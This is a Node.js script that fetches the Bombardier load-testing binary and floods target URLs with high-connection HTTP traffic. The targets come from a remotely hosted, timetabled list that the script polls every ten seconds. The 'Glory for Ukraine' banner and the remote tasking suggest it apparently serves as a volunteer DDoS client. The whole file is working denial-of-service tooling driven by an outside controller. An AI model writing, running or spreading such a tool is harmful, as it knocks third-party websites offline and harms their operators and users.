const { spawn } = require("child_process");
const path = require("path");
const https = require("https");
const http = require("http");
const { URL } = require('url');
const fs = require("fs");

let parallelFactor = 1;
let scheduledTargetsUrl = null;

let targets = [];
let targetWorkers = [];
let scheduledTargets = {};

function TargetWorker(target) {
    this.promise = null;

    const plan = processTarget(target);
    if (plan) {
        const timeout = (target.duration || 10) * 1000 * 2 * parallelFactor;
        const { process, processPromise } = plan;

        const timeoutPromise = new Promise((_, reject) => setTimeout(reject, timeout))
            .catch(() => {
                process.kill();
                throw Error("Worker timeout");
            });

        this.promise = Promise.race([processPromise, timeoutPromise]);
    } else {
        this.promise = Promise.resolve();
    }

    return this;
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

function httpGet(url) {
    return new Promise((resolve, reject) => {
        (url.startsWith("https://") ? https : http).get(url, async (res) => {
            if (res.statusCode == 301 || res.statusCode == 302) {
                return resolve(httpGet(res.headers.location));
            }
            let body = [];
            res
                .on('data', (chunk) => body.push(chunk))
                .on('end', () => resolve(Buffer.concat(body)));
        }).on('error', (error) => {
            reject(error);
        });
    });
}

async function getScheduledTargets() {
    try {
        const text = await httpGet(scheduledTargetsUrl.toString());
        const json = JSON.parse(text);
        return json;
    } catch (ex) {
        console.error("[Error] fetching scheduled targets url:", ex.message);
        return null;
    }
}

function bombardierExecutableRelativePath() {
    switch (process.platform) {
        case "win32":
            return "bombardier.exe";
        case "darwin":
        case "linux":
            return "bombardier";
    }

    throw Error(`Unsupported OS: ${process.platform}`);
}

function bombardierExecutablePath() {
    return path.join(path.resolve(), bombardierExecutableRelativePath());
}

function processTarget(target) {
    if (target.type == "url") {
        const args = [
            ...[target.method ? `--method=${target.method.toUpperCase()}` : null].filter(Boolean),
            `--connections=${target.connections || 1000}`,
            `--duration=${target.duration || 10}s`,
            "--format=json",
            target.url,
        ];

        const process = spawn(bombardierExecutablePath(), args, {});
        const processPromise = new Promise((resolve, reject) => {
            let stdout = "";
            let stderr = "";

            process.stdout.on("data", (data) => {
                stdout += data.toString();
            });
            process.stderr.on("data", (data) => {
                stderr += data.toString();
            });

            process
                .on("error", (error) => {
                    reject(error);
                })
                .on("exit", () => {
                    resolve({ stdout, stderr });
                })
                .on("close", () => {
                    resolve({ stdout, stderr });
                });
        });

        return { process, processPromise };
    }

    return null;
}

async function nextTarget() {
    if (targetWorkers.length >= parallelFactor || targets.length === 0) {
        return;
    }

    const index = getRandomInt(targets.length);
    const target = targets[index];

    console.log("[Start]", target.url);

    const worker = new TargetWorker(target);

    worker.promise
        .then(
            () => console.log("[Done]", target.url),
            (error) => console.log("[Error]", target.url, ">", error.message)
        )
        .finally(() => {
            const index = targetWorkers.indexOf(worker);
            if (index !== -1) {
                targetWorkers.splice(index, 1);
            }
        });

    targetWorkers.push(worker);
}

function ToTarget(now, schedule, target) {
    if (!target) {
        console.error("target: not defined");
        return null;
    }

    if (["url"].indexOf(target.type) == -1) {
        console.error(`target: unknown target type ${target.type}`);
        return null;
    }

    if (target.method && ["get", "post", "put", "delete", "patch", "head", "options", "trage"].indexOf(target.method) == -1) {
        console.error(`target: unknown target method ${target.method}`);
        return null;
    }

    return {
        group: target.group || "default",
        type: target.type,
        url: target.url,
        method: target.method || "get",
    };
}

function ToTimetableRecord(now, schedule, record) {
    function MatchGroup(group) {
        return schedule.targets.some((target) => target.group === group);
    }

    const timetableRecord = {
        start: record.start === "now" ? now : new Date(Date.parse(record.start)),
        end: record.end ? new Date(Date.parse(record.end)) : new Date(8640000000000000),
        groups: (record.groups || []).filter(MatchGroup),
    };

    if (!timetableRecord.groups.length) {
        return null;
    }

    return timetableRecord;
}

async function updateScheduledTargets() {
    const now = new Date();

    function MatchCurrent(record) {
        return record.start <= now && now <= record.end;
    }

    scheduledTargets = (await getScheduledTargets() || { timetable: [], targets: [] });
    scheduledTargets.targets = scheduledTargets.targets.map(ToTarget.bind(null, now, scheduledTargets)).filter(Boolean);
    scheduledTargets.timetable = scheduledTargets.timetable.map(ToTimetableRecord.bind(null, now, scheduledTargets)).filter(Boolean);

    targets = scheduledTargets.timetable
        .filter(MatchCurrent)
        .map(record => record.groups)
        .flat()
        .map(group => scheduledTargets.targets.filter(target => target.group === group))
        .flat();
}

async function checkBombardierExecutableFile() {
    const bombardierExePath = bombardierExecutablePath();
    if (fs.existsSync(bombardierExePath)) {
        return;
    }

    let executablePath = "";
    let executableUrl = "";

    switch (process.platform) {
        case "win32":
            executablePath = path.join(executablePath, "bombardier.exe");

            switch (process.arch) {
                case "x32":
                    executableUrl = "https://github.com/codesenberg/bombardier/releases/download/v1.2.5/bombardier-windows-386.exe";
                    break;
                case "x64":
                    executableUrl = "https://github.com/codesenberg/bombardier/releases/download/v1.2.5/bombardier-windows-amd64.exe";
                    break;
            }
            break;
        case "darwin":
            executablePath = path.join(executablePath, "bombardier");
            executableUrl = "https://github.com/codesenberg/bombardier/releases/download/v1.2.5/bombardier-darwin-amd64";
            break;
        case "linux":
            executablePath = path.join(executablePath, "bombardier");
            switch (process.arch) {
                case "x32":
                    executableUrl = "https://github.com/codesenberg/bombardier/releases/download/v1.2.5/bombardier-linux-386";
                    break;
                case "x64":
                    executableUrl = "https://github.com/codesenberg/bombardier/releases/download/v1.2.5/bombardier-linux-amd64";
                    break;
            }
            break;
    }

    if (!fs.existsSync(path.dirname(executablePath))) {
        fs.mkdirSync(path.dirname(executablePath));
    }

    const blob = await httpGet(executableUrl);

    fs.writeFileSync(executablePath, blob);
    fs.chmodSync(executablePath, 0x775);
}

function printGreeting() {
    console.log(`
    ██████████████████████████████
    ██████████████░░██████████████
    ████░████████░░░░████████░████
    ████░░░██████░░░░██████░░░████
    ████░█░░░█████░░██████░░█░████
    ████░██░░█████░░█████░░██░████
    ████░███░░████░░████░░███░████
    ████░███░░████░░████░░███░████
    ████░███░░████░░████░░███░████
    ████░████░░███░░███░░████░████
    ████░████░░███░░███░░████░████
    ████░██░░░███░░░░███░░░██░████
    ████░██░░███░░██░░███░░██░████
    ████░██░░░██████████░░░██░████
    ████░████░░░░░██░░░░░████░████
    ████░█████░░██░░██░░█████░████
    ████░░░░░░░░░░░░░░░░░░░░░░████
    ██████████░░██░░██░░██████████
     ██████████░░█░░█░░██████████
      ██████████░░░░░░██████████
        █████████░░░░█████████
          ██████████████████
                 ████`,
        "\n\n          Glory for Ukraine\n");
}

process
    .on("SIGINT", () => {
        process.exit();
    })
    .on("unhandledRejection", (ex) => {
        console.log(ex);
    });

(async function main() {
    printGreeting();

    try {
        await checkBombardierExecutableFile();
    } catch (ex) {
        console.error("Error: preparing Bombardier executable.", ">", ex.message);
        process.exit(1);
    }

    if (process.env.PARALLEL_FACTOR) {
        parallelFactor = Number(process.env.PARALLEL_FACTOR);

        if (parallelFactor === NaN || parallelFactor < 1 || parallelFactor > 100) {
            console.error("Error: Envirounment variable [PARALLEL_FACTOR] not defined or not in range of [1..100].");
            process.exit(1);
        }
    }

    try {
        scheduledTargetsUrl = new URL(process.env.SCHEDULED_TARGETS_URL);
    } catch (ex) {
        console.error(`Error: Envirounment variable [SCHEDULED_TARGETS_URL] not defined or invalid. Value: [${process.env.SCHEDULED_TARGETS_URL}]`);
        process.exit(1);
    }

    console.log(`[NOTE] Started with scheduled targets store ${scheduledTargetsUrl} and parallel factor ${parallelFactor}.`);

    await updateScheduledTargets();

    setInterval(updateScheduledTargets, 10000);
    setInterval(nextTarget, 1000);
})();
